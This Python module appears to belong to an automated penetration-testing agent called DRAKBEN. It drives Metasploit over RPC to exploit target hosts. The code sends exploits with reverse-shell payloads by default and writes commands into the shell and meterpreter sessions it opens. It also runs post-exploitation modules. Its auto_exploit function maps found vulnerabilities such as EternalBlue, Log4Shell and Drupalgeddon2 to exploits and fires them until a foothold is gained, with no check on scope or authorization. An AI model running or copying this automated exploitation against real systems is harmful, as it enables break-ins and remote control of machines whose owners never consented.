# modules/metasploit.py
# DRAKBEN Metasploit RPC Integration
# Automated exploitation through Metasploit Framework

import asyncio
import json
import logging
import socket
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from core.state import AgentState
from enum import Enum

import aiohttp

logger = logging.getLogger(__name__)

# Optional msgpack for MSFRPC
try:
    import msgpack
    MSGPACK_AVAILABLE = True
except ImportError:
    MSGPACK_AVAILABLE = False
    logger.info("msgpack not installed - using JSON fallback")

# Optional requests for HTTP API
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class SessionType(Enum):
    """Metasploit session types"""
    SHELL = "shell"
    METERPRETER = "meterpreter"
    VNC = "vnc"
    UNKNOWN = "unknown"


class ExploitStatus(Enum):
    """Exploit execution status"""
    SUCCESS = "success"
    FAILED = "failed"
    RUNNING = "running"
    NO_SESSION = "no_session"
    ERROR = "error"


@dataclass
class MSFSession:
    """Metasploit session information"""
    session_id: int
    session_type: SessionType
    target_host: str
    target_port: int
    via_exploit: str
    via_payload: str
    username: str = ""
    info: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "session_id": self.session_id,
            "session_type": self.session_type.value,
            "target_host": self.target_host,
            "target_port": self.target_port,
            "via_exploit": self.via_exploit,
            "via_payload": self.via_payload,
            "username": self.username,
            "info": self.info
        }


@dataclass
class ExploitResult:
    """Exploit execution result"""
    status: ExploitStatus
    exploit_name: str
    target: str
    session: Optional[MSFSession] = None
    output: str = ""
    error: str = ""
    duration_seconds: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "status": self.status.value,
            "exploit_name": self.exploit_name,
            "target": self.target,
            "session": self.session.to_dict() if self.session else None,
            "output": self.output,
            "error": self.error,
            "duration_seconds": self.duration_seconds
        }


class MetasploitRPC:
    """
    Metasploit RPC Client.
    
    Supports both MSGRPC (msgpack) and REST API.
    
    Usage:
        msf = MetasploitRPC()
        await msf.connect("127.0.0.1", 55553, "msf", "password")
        result = await msf.run_exploit("exploit/windows/smb/ms17_010_eternalblue", "192.168.1.100")
    """
    
    def __init__(self, use_ssl: bool = False):
        """
        Initialize Metasploit RPC client.
        
        Args:
            use_ssl: Use SSL for connection
        """
        self.host: str = ""
        self.port: int = 55553
        self.token: str = ""
        self.use_ssl = use_ssl
        self.connected = False
        self._session_counter = 0
        logger.info("MetasploitRPC client initialized")
    
    async def connect(
        self, 
        host: str = "127.0.0.1", 
        port: int = 55553,
        username: str = "msf",
        password: str = ""
    ) -> bool:
        """
        Connect to Metasploit RPC server.
        
        Args:
            host: MSFRPC host
            port: MSFRPC port
            username: Username
            password: Password
            
        Returns:
            True if connected successfully
        """
        self.host = host
        self.port = port
        
        logger.info(f"Connecting to Metasploit RPC at {host}:{port}")
        
        try:
            # Try JSON-RPC first (more common)
            protocol = "https" if self.use_ssl else "http"
            url = f"{protocol}://{host}:{port}/api/"
            
            # Using aiohttp for async support
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(
                    url,
                    json={
                        "method": "auth.login",
                        "params": [username, password]
                    },
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        if "result" in data and "token" in data["result"]:
                            self.token = data["result"]["token"]
                            self.connected = True
                            logger.info("Connected to Metasploit RPC")
                            return True
            
            # Fallback: try msgpack RPC
            if MSGPACK_AVAILABLE:
                return self._connect_msgpack(host, port, username, password)
            
            logger.warning("Could not connect to Metasploit RPC")
            return False
            
        except Exception as e:
            logger.error(f"Connection error: {e}")
            return False

    def _connect_msgpack(
        self, 
        host: str, 
        port: int, 
        username: str, 
        password: str
    ) -> bool:
        """Connect using msgpack RPC"""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            
            # Send auth request
            request = msgpack.packb(["auth.login", username, password])
            sock.send(request)
            
            # Receive response
            response = sock.recv(65535)
            result = msgpack.unpackb(response, raw=False)
            
            if "token" in result:
                self.token = result["token"]
                self.connected = True
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Msgpack RPC error: {e}")
            return False
        finally:
            # ALWAYS close socket to prevent leaks
            if sock:
                try:
                    sock.close()
                except (OSError, AttributeError) as e:
                    logger.debug(f"Error closing socket: {e}")
    
    async def disconnect(self) -> None:
        """Disconnect from Metasploit RPC"""
        if self.connected and self.token:
            try:
                await self._call("auth.logout", [self.token])
            except Exception:
                pass
        
        self.connected = False
        self.token = ""
        logger.info("Disconnected from Metasploit RPC")

    async def _call(self, method: str, params: Optional[List[Any]] = None) -> Dict[str, Any]:
        """
        Call RPC method.
        
        Args:
            method: Method name
            params: Parameters
            
        Returns:
            Response dictionary
        """
        if not self.connected:
            raise ConnectionError("Not connected to Metasploit RPC")
        
        params = params or []
        
        try:
            protocol = "https" if self.use_ssl else "http"
            url = f"{protocol}://{self.host}:{self.port}/api/"
            
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(
                    url,
                    json={
                        "method": method,
                        "token": self.token,
                        "params": params
                    },
                    timeout=aiohttp.ClientTimeout(total=60)
                ) as response:
                    return await response.json()
            
        except Exception as e:
            logger.error(f"RPC call error: {e}")
            return {"error": str(e)}
    
    async def get_version(self) -> str:
        """Get Metasploit version"""
        result = await self._call("core.version")
        return result.get("result", {}).get("version", "unknown")
    
    async def list_exploits(self, search: str = "") -> List[str]:
        """
        List available exploits.
        
        Args:
            search: Search filter
            
        Returns:
            List of exploit names
        """
        result = await self._call("module.exploits")
        exploits = result.get("result", {}).get("modules", [])
        
        if search:
            exploits = [e for e in exploits if search.lower() in e.lower()]
        
        return exploits
    
    async def list_payloads(self, search: str = "") -> List[str]:
        """
        List available payloads.
        
        Args:
            search: Search filter
            
        Returns:
            List of payload names
        """
        result = await self._call("module.payloads")
        payloads = result.get("result", {}).get("modules", [])
        
        if search:
            payloads = [p for p in payloads if search.lower() in p.lower()]
        
        return payloads
    
    async def get_exploit_info(self, exploit_name: str) -> Dict[str, Any]:
        """
        Get exploit module information.
        
        Args:
            exploit_name: Exploit module name
            
        Returns:
            Exploit information dictionary
        """
        result = await self._call("module.info", ["exploit", exploit_name])
        return result.get("result", {})
    
    async def get_exploit_options(self, exploit_name: str) -> Dict[str, Any]:
        """
        Get exploit options.
        
        Args:
            exploit_name: Exploit module name
            
        Returns:
            Options dictionary
        """
        result = await self._call("module.options", ["exploit", exploit_name])
        return result.get("result", {})
    
    async def run_exploit(
        self,
        exploit_name: str,
        target_host: str,
        target_port: Optional[int] = None,
        payload: str = "generic/shell_reverse_tcp",
        lhost: str = "",
        lport: int = 4444,
        options: Optional[Dict[str, Any]] = None
    ) -> ExploitResult:
        """
        Run an exploit against a target.
        
        Args:
            exploit_name: Exploit module name
            target_host: Target host
            target_port: Target port
            payload: Payload module name
            lhost: Local host for reverse connections
            lport: Local port for reverse connections
            options: Additional options
            
        Returns:
            ExploitResult object
        """
        start_time = time.time()
        options = options or {}
        timeout_seconds = 120  # Fixed timeout value
        
        logger.info(f"Running exploit: {exploit_name} against {target_host}")
        
        try:
            # Set exploit options
            exploit_options = {
                "RHOSTS": target_host,
                "PAYLOAD": payload,
                "LHOST": lhost or self._get_local_ip(),
                "LPORT": lport,
                **options
            }
            
            if target_port:
                exploit_options["RPORT"] = target_port
            
            # Execute exploit
            result = await self._call("module.execute", [
                "exploit",
                exploit_name,
                exploit_options
            ])
            
            if "error" in result:
                return ExploitResult(
                    status=ExploitStatus.ERROR,
                    exploit_name=exploit_name,
                    target=target_host,
                    error=result["error"],
                    duration_seconds=time.time() - start_time
                )
            
            # Wait for exploit to complete
            async with asyncio.timeout(timeout_seconds):
                session = await self._wait_for_session(target_host)
            
            duration = time.time() - start_time
            
            if session:
                logger.info(f"Exploit successful! Session {session.session_id} opened")
                return ExploitResult(
                    status=ExploitStatus.SUCCESS,
                    exploit_name=exploit_name,
                    target=target_host,
                    session=session,
                    duration_seconds=duration
                )
            else:
                return ExploitResult(
                    status=ExploitStatus.NO_SESSION,
                    exploit_name=exploit_name,
                    target=target_host,
                    output="Exploit completed but no session was created",
                    duration_seconds=duration
                )
                
        except TimeoutError:
            return ExploitResult(
                status=ExploitStatus.FAILED,
                exploit_name=exploit_name,
                target=target_host,
                error=f"Timeout after {timeout_seconds}s",
                duration_seconds=time.time() - start_time
            )
        except Exception as e:
            logger.error(f"Exploit error: {e}")
            return ExploitResult(
                status=ExploitStatus.ERROR,
                exploit_name=exploit_name,
                target=target_host,
                error=str(e),
                duration_seconds=time.time() - start_time
            )
    
    async def _wait_for_session(
        self, 
        target_host: str
    ) -> Optional[MSFSession]:
        """Wait for a session to be created"""
        timeout_seconds = 120  # Fixed timeout value
        start_time = time.time()
        
        while time.time() - start_time < timeout_seconds:
            sessions = await self.list_sessions()
            
            for session in sessions:
                if session.target_host == target_host:
                    return session
            
            await asyncio.sleep(2)
        
        return None
    
    async def list_sessions(self) -> List[MSFSession]:
        """
        List active sessions.
        
        Returns:
            List of MSFSession objects
        """
        result = await self._call("session.list")
        sessions = []
        
        for sid, info in result.get("result", {}).items():
            try:
                session_type = SessionType.SHELL
                if "meterpreter" in info.get("type", "").lower():
                    session_type = SessionType.METERPRETER
                elif "vnc" in info.get("type", "").lower():
                    session_type = SessionType.VNC
                
                sessions.append(MSFSession(
                    session_id=int(sid),
                    session_type=session_type,
                    target_host=info.get("target_host", ""),
                    target_port=info.get("target_port", 0),
                    via_exploit=info.get("via_exploit", ""),
                    via_payload=info.get("via_payload", ""),
                    username=info.get("username", ""),
                    info=info.get("info", "")
                ))
            except Exception as e:
                logger.error(f"Error parsing session: {e}")
        
        return sessions
    
    async def session_shell_read(self, session_id: int) -> str:
        """
        Read from shell session.
        
        Args:
            session_id: Session ID
            
        Returns:
            Shell output
        """
        result = await self._call("session.shell_read", [session_id])
        return result.get("result", {}).get("data", "")
    
    async def session_shell_write(self, session_id: int, command: str) -> bool:
        """
        Write command to shell session.
        
        Args:
            session_id: Session ID
            command: Command to execute
            
        Returns:
            True if successful
        """
        result = await self._call("session.shell_write", [session_id, command + "\n"])
        return result.get("result", {}).get("write_count", 0) > 0
    
    async def session_meterpreter_read(self, session_id: int) -> str:
        """Read from meterpreter session"""
        result = await self._call("session.meterpreter_read", [session_id])
        return result.get("result", {}).get("data", "")
    
    async def session_meterpreter_write(self, session_id: int, command: str) -> bool:
        """Write command to meterpreter session"""
        result = await self._call("session.meterpreter_write", [session_id, command])
        return "error" not in result
    
    async def session_meterpreter_run_single(
        self, 
        session_id: int, 
        command: str
    ) -> str:
        """
        Run single meterpreter command.
        
        Args:
            session_id: Session ID
            command: Meterpreter command
            
        Returns:
            Command output
        """
        await self._call(
            "session.meterpreter_run_single", 
            [session_id, command]
        )
        
        # Wait for output
        await asyncio.sleep(1)
        return await self.session_meterpreter_read(session_id)
    
    async def kill_session(self, session_id: int) -> bool:
        """
        Kill a session.
        
        Args:
            session_id: Session ID
            
        Returns:
            True if successful
        """
        result = await self._call("session.stop", [session_id])
        return result.get("result") == "success"
    
    async def run_post_module(
        self,
        session_id: int,
        module_name: str,
        options: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """
        Run post-exploitation module.
        
        Args:
            session_id: Session ID
            module_name: Post module name
            options: Module options
            
        Returns:
            Module output
        """
        options = options or {}
        options["SESSION"] = session_id
        
        result = await self._call("module.execute", [
            "post",
            module_name,
            options
        ])
        
        return result.get("result", {})
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"


# Exploit mapping for common vulnerabilities
VULN_TO_EXPLOIT = {
    "ms17_010": "exploit/windows/smb/ms17_010_eternalblue",
    "eternalblue": "exploit/windows/smb/ms17_010_eternalblue",
    "ms08_067": "exploit/windows/smb/ms08_067_netapi",
    "shellshock": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
    "heartbleed": "auxiliary/scanner/ssl/openssl_heartbleed",
    "struts2": "exploit/multi/http/struts2_content_type_ognl",
    "tomcat_mgr": "exploit/multi/http/tomcat_mgr_upload",
    "jenkins_script": "exploit/multi/http/jenkins_script_console",
    "drupalgeddon2": "exploit/unix/webapp/drupal_drupalgeddon2",
    "apache_rce": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
    "log4shell": "exploit/multi/http/log4shell_header_injection",
    "vsftpd_234": "exploit/unix/ftp/vsftpd_234_backdoor",
    "proftpd_133c": "exploit/unix/ftp/proftpd_133c_backdoor",
    "samba_usermap": "exploit/multi/samba/usermap_script",
}


def suggest_exploit_for_vuln(vuln_type: str) -> Optional[str]:
    """
    Suggest Metasploit exploit for vulnerability type.
    
    Args:
        vuln_type: Vulnerability type
        
    Returns:
        Exploit module name or None
    """
    vuln_lower = vuln_type.lower().replace("-", "_").replace(" ", "_")
    
    for key, exploit in VULN_TO_EXPLOIT.items():
        if key in vuln_lower:
            return exploit
    
    return None


# State integration
async def auto_exploit(
    state: "AgentState",
    msf: MetasploitRPC,
    lhost: str = "",
    lport: int = 4444
) -> List[ExploitResult]:
    """
    Automatically run exploits for vulnerabilities in state.
    
    Args:
        state: AgentState instance
        msf: MetasploitRPC client
        lhost: Local host for reverse connections
        lport: Local port
        
    Returns:
        List of ExploitResult objects
    """
    results = []
    
    if not state.target:
        logger.warning("Target must be set in state for auto_exploit")
        return results
    for vuln in state.vulnerabilities:
        exploit = suggest_exploit_for_vuln(vuln.vuln_id)
        
        if exploit:
            logger.info(f"Attempting {exploit} for {vuln.vuln_id}")
            
            result = await msf.run_exploit(
                exploit_name=exploit,
                target_host=state.target,
                lhost=lhost,
                lport=lport
            )
            
            results.append(result)
            
            # Update state if successful
            if result.status == ExploitStatus.SUCCESS:
                state.set_foothold(exploit)
                break
            
            lport += 1  # Increment port for next attempt
    
    return results
